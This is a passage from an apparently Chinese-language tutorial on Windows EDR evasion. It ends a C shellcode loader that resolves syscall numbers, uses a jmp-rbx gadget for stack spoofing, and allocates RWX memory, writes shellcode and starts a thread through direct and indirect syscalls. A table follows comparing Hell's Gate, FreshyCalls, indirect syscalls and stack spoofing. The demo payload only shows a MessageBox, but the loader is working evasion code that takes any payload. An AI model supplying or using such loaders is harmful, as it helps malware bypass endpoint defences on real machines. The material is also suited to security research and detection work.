	if (!jmp_gadget)
		jmp_gadget = find_jmp_rbx(GetModuleHandleA("kernelbase.dll"));
	if (!jmp_gadget)
		jmp_gadget = find_jmp_rbx(GetModuleHandleA("ntdll.dll"));
	printf("ssn alloc=%X write=%X create=%X syscall=%p jmp_rbx=%p\n",
		ssn_alloc, ssn_write, ssn_create, (void*)sys_addr, (void*)jmp_gadget);
	if (ssn_alloc == (DWORD)-1 || ssn_write == (DWORD)-1 || ssn_create == (DWORD)-1 || !sys_addr || !jmp_gadget)
		return 1;
	unsigned char shellcode[] = {
		0x48, 0x83, 0xEC, 0x28,
		0x48, 0x31, 0xC9,
		0x48, 0x8D, 0x15, 0x1B, 0x00, 0x00, 0x00,
		0x4C, 0x8D, 0x05, 0x24, 0x00, 0x00, 0x00,
		0x4D, 0x31, 0xC9,
		0x48, 0xB8, 0, 0, 0, 0, 0, 0, 0, 0,
		0xFF, 0xD0,
		0x48, 0x83, 0xC4, 0x28,
		0xC3,
		'H','e','l','l','o',0,0,0,0,0,0,0,0,0,0,0,
		's','y','s','c','a','l','l',0,0,0,0,0,0,0,0,0
	};
	memcpy(shellcode + 0x1A, &pMessageBoxA, sizeof(pMessageBoxA));

	PVOID pshellcode = NULL;
	SIZE_T region = sizeof(shellcode);
	NTSTATUS sta = sysall((HANDLE)-1, &pshellcode, 0, &region,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (sta != 0) {
		printf("sysall failed: 0x%X\n", sta);
		return 1;
	}
	sta = syswir((HANDLE)-1, pshellcode, shellcode, sizeof(shellcode), NULL);
	if (sta != 0) {
		printf("syswir failed: 0x%X\n", sta);
		return 1;
	}
	HANDLE htread = NULL;
	sta = syscrea(&htread, THREAD_ALL_ACCESS, NULL, (HANDLE)-1, pshellcode, NULL, FALSE, 0, 0, 0, NULL);
	if (sta != 0) {
		printf("syscrea failed: 0x%X\n", sta);
		return 1;
	}
	WaitForSingleObject(htread, INFINITE);
	CloseHandle(htread);
	VirtualFree(pshellcode, 0, MEM_RELEASE);

	printf("Shellcode executed successfully.\n");
	return 0;
}
```

优先在 kernel32 / kernelbase 里找，找不到再退回 ntdll。汇编侧 syscall 之后不直接 ret 回 exe，而是经过这个 gadget。

这只能骗浅层栈回溯，ETW、内核回调、完整 call stack 对得上 gadget 链时仍能看出来。

* * *

## 对照

|     |     |     |     |
| --- | --- | --- | --- |   
| 方法  | SSN 怎么来 | syscall 在哪 | 主要问题 |
| 硬编码 | 写死  | 本模块 | 一升级就失效 |
| 动态读 stub | ntdll+4 | 本模块 | 函数头被 Hook 就读错 |
| Hell’s Gate | 邻居连续号 | 本模块 | 依赖 0x20 间距和连续 SSN |
| FreshyCalls | Zw 导出按地址排序的下标 | 本模块 | 不看字节，不怕头被改 |
| 间接调用 | 上面任意一种 | ntdll 的 syscall;ret | 返回地址仍可能落在 exe |
| 栈欺骗 | 同上  | ntdll gadget + kernel jmp | 浅层好看，深层仍能查 |

流程可以记成：先拿到对的 SSN（Hell’s Gate / FreshyCalls）→ 再决定 syscall 从哪执行（直接 / 间接）→ 再决定返回地址像不像（栈欺骗）。
